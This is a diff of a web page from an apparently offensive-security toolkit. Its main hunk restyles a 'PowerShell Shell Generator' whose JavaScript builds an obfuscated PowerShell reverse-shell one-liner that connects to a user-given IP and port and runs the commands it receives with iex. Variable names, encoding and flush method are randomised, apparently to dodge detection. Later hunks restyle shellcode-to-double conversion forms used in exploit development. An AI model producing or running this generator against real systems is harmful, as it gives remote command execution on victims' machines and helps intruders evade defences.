@@ -54,18 +54,30 @@ order: 4
 
 ## PowerShell Shell Generator
 
-<div>
-    <label for="ip">IP Address:</label>
-    <input type="text" id="ip" placeholder="Enter IP" />
-    <label for="port">Port:</label>
-    <input type="text" id="port" placeholder="Enter Port" />
-    <button onclick="generateCode()">Generate PowerShell</button>
+<div class="container">
+    <div class="row">
+        <div class="col-md-6">
+            <form>
+                <div class="form-group">
+                    <label for="ip">IP Address</label>
+                    <input type="text" class="form-control" id="ip" placeholder="127.0.0.1" />
+                </div>
+                <div class="form-group">
+                    <label for="port">Port</label>
+                    <input type="text" class="form-control" id="port" placeholder="443" />
+                </div>
+                <button type="button" class="btn btn-primary mt-2" onclick="generateCode()">Generate</button>
+            </form>
+        </div>
+    </div>
+    <div class="row mt-4" id="outputContainer" style="display: none;">
+        <div class="col-12">
+            <div id="output" class="p-3 bg-dark text-white rounded" style="white-space: pre-wrap; font-family: monospace;"></div>
+        </div>
+    </div>
 </div>
-<hr>
-<div id="output" class="generated-code"></div>
 
 <script>
-    // Function to generate random variable names
     function getRandomVariable() {
         const chars = 'abcdefghijklmnopqrstuvwxyz';
         let varName = '';
@@ -75,13 +87,10 @@ order: 4
         return varName;
     }
 
-    // Function to generate a correct byte array
     function generateByteArray(variableName) {
-        // Ensuring the byte array is initialized correctly with a fixed size
         return `[byte[]]$${variableName} = New-Object byte[] 65535;`;
     }
 
-    // Function to generate random PowerShell script as one-liner
     function generateCode() {
         const ip = document.getElementById("ip").value;
         const port = document.getElementById("port").value;
@@ -102,15 +111,14 @@ order: 4
         const varEncoding = Math.random() < 0.5 ? "ASCII" : "UTF8";
         const flushMethod = Math.random() < 0.5 ? "$stream.Flush();" : "[System.Threading.Thread]::Sleep(100);";
 
-        // Correct byte array initialization
         const byteArrayInit = generateByteArray(varBytes);
 
-        // Template for PowerShell code (as a one-liner)
         const powershellTemplate = `
 $${varClient}=New-Object System.Net.Sockets.TCPClient("${ip}",${port});$${varStream}=$${varClient}.GetStream();${byteArrayInit}while(($${varI}=$${varStream}.Read($${varBytes},0,$${varBytes}.Length)) -ne 0){$${varData}=(New-Object -TypeName System.Text.${varEncoding}Encoding).GetString($${varBytes},0,$${varI});$${varSendback}=try{iex $${varData} 2>&1 | Out-String}catch{\$_};$${varSendback2}=$${varSendback}+"[>] ";$${varSendbyte}=([text.encoding]::${varEncoding}).GetBytes($${varSendback2});$${varStream}.Write($${varSendbyte},0,$${varSendbyte}.Length);${flushMethod}};$${varClient}.Close();
         `.replace(/\s+/g, ' ').replace(/\s?;\s?/g, ';').replace(/\s?{\s?/g, '{').trim();
 
         document.getElementById("output").innerText = powershellTemplate;
+        document.getElementById('outputContainer').style.display = 'block';
     }
 </script>
 
@@ -162,11 +170,11 @@ function inputToDouble(){
 }
 </script>
 
-<textarea id="inputToDouble" name="inputToDouble" rows="10" cols="80" placeholder="Example:
+<textarea id="inputToDouble" name="inputToDouble" rows="10" cols="60" placeholder="Example:
 0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41.."></textarea>
 
 <form onsubmit="return inputToDouble();" form="jsShellcodeForm">
-    <input type="submit" value="Convert">
+    <input type="submit" class="btn btn-primary" value="Convert">
 </form>
 
 
@@ -210,11 +218,11 @@ function inputFromDouble(){
 }
 </script>
 
-<textarea id="inputFromDouble" name="inputFromDouble" rows="10" cols="80" placeholder="Example:
+<textarea id="inputFromDouble" name="inputFromDouble" rows="10" cols="60" placeholder="Example:
 6.867659397734779e+246
 7.806615353364766e+184
 .."></textarea>
 
 <form onsubmit="return inputFromDouble();" form="jsDoubleForm">
-    <input type="submit" value="Convert">
+    <input type="submit" class="btn btn-primary" value="Convert">
 </form>
